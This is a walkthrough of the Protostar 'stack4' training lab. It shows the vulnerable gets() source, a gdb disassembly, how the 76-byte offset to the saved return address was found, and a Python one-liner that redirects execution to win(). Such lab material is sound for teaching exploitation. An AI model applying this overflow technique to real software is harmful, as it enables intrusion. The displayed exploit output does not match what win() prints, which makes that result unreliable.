---
title: "stack4"
date: "2023-05-16"
site: https://exploit.education/protostar/
---

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

## Disassembly

```c
user@protostar:/opt/protostar/bin$ gdb -batch -ex 'file stack4' -ex 'disassemble win'
Dump of assembler code for function win:
0x080483f4 <win+0>:     push   %ebp
0x080483f5 <win+1>:     mov    %esp,%ebp
0x080483f7 <win+3>:     sub    $0x18,%esp
0x080483fa <win+6>:     movl   $0x80484e0,(%esp)
0x08048401 <win+13>:    call   0x804832c <puts@plt>
0x08048406 <win+18>:    leave
0x08048407 <win+19>:    ret
End of assembler dump.
```

## Analysis

We no longer have a `modified` variable right above it.

However, the `eip` is still located above `buffer` so we can still overwrite it.

We need to overwrite it to the value of `0x080483f4`.

```
(gdb) r
Starting program: /opt/protostar/bin/stack4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDZZZZ

Program received signal SIGSEGV, Segmentation fault.
0x5a5a5a5a in ?? ()
```

We can calculate that the `eip` is 76 bytes away from the start of `buffer`.

### Exploit

```bash
user@protostar:/opt/protostar/bin$ echo $(python -c 'print "A"*76 + "\xf4\x83\x04\x08"') | ./stack4
you have changed the 'modified' variable
Try again?
Segmentation fault
```
